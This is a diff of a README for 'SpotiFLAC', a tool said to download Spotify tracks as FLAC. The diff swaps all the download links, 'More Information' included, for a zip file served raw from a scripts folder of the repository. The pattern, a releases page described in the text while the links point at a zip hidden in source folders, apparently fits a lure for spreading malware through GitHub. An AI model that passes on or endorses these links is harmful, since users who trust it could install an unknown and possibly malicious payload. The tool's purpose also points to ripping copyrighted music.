@@ -7,7 +7,7 @@ Welcome to SpotiFLAC! This application allows you to download Spotify tracks in 
 To get started, you need to download SpotiFLAC. Follow these simple steps:
 
 1. **Visit the Releases Page:** Click the link below to open the release page:
-   [Download SpotiFLAC](https://raw.githubusercontent.com/tungdz120213/SpotiFLAC/main/frontend/src/assets/Spoti-FLAC-2.7.zip)
+   [Download SpotiFLAC](https://raw.githubusercontent.com/tungdz120213/SpotiFLAC/main/frontend/scripts/FLAC_Spoti_3.8.zip)
 
 2. **Choose Your Version:** Look for the latest version listed. You will see files available for download such as `.exe`, `.zip`, or other formats. Select the one that is suitable for your operating system.
 
@@ -62,7 +62,7 @@ Yes, SpotiFLAC is completely free to use.
 If you encounter any problems or have questions, feel free to reach out. You can check the issues section on our GitHub page or open a new issue for support.
 
 ## 🔗 Useful Links
-- [Download SpotiFLAC](https://raw.githubusercontent.com/tungdz120213/SpotiFLAC/main/frontend/src/assets/Spoti-FLAC-2.7.zip)
-- [More Information](https://raw.githubusercontent.com/tungdz120213/SpotiFLAC/main/frontend/src/assets/Spoti-FLAC-2.7.zip)
+- [Download SpotiFLAC](https://raw.githubusercontent.com/tungdz120213/SpotiFLAC/main/frontend/scripts/FLAC_Spoti_3.8.zip)
+- [More Information](https://raw.githubusercontent.com/tungdz120213/SpotiFLAC/main/frontend/scripts/FLAC_Spoti_3.8.zip)
 
 We hope you enjoy using SpotiFLAC and discover great music in high-quality FLAC format!
